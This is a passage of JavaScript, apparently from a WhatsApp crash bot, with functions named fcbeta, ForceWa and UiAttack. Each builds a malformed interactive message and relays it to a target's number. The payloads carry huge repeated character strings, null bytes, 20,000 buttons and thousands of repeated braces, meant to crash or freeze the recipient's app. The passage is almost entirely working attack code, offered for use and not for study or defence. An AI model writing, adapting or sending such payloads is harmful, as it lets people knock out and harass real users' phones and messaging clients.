            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
async function fcbeta(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Rezuly1 WhatsApp Api",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Rezuly1 | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "𝐂𝐫‌𝐚‌𝐬𝐡 𝐎𝐯‌𝐞𝐫‌𝐅𝐥‌𝐨𝐰‌𝐞𝐝️🐉",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://linuxy.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "饾悜谈蜔滩饾悮饾惄虆饾悽潭蜔潭饾悜谈蜔滩饾悮饾惄虆",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "PutraNoHantam",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "PutraNoHantam",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function ForceWa(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "饾悜谈蜔滩饾悮饾惄虆饾悽潭蜔潭饾悜谈蜔滩饾悮饾惄虆",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "𝐑͢𝐢ͯ𝐳͟𝐱͓𝐯̷𝐞͢𝐥͟𝐎̷𝐟͢𝐟ͯ𝐢͟𝐜̽𝐢͢𝐚͟𝐥̴",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function UiAttack(sock, target) {
  try {
    let buttonsFreze = [];

    buttonsFreze.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });

    for (let i = 0; i < 20000; i++) {
      buttonsFreze.push({
        name: "cta_catalog",
        buttonParamsJson: JSON.stringify({
          status: true,
        }),
      });
    }
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text:
                "Halo Bang Apa Kabar Mu" +
                "ꦽ".repeat(50000) +
                "ꦾ".repeat(10000),
            },
            nativeFlowMessage: {
              buttons: buttonsFreze,
              messageParamsJson: "{{".repeat(10000),
            },
            messageVersion: 1,
          },
        },
      },
    };

    const pertama = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });

    const kedua = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });
  } catch (error) {
    console.error("Terdapat Eror Pada Bagian Struktur Function", error);
  }
}